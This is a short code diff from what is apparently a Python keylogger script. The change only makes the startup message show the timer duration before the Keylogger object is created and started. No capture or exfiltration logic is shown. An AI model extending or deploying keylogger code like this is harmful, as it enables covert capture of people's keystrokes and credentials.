@@ -106,7 +106,7 @@ class Keylogger:
         return
 
 def keys_logger():
-    print('starting keys logger information')
+    print(f'starting keys logger information ({TIMER_DURATION}s)')
     keylogger = Keylogger(time_interval=TIMER_DURATION, debug=False)
     keylogger.start()
 
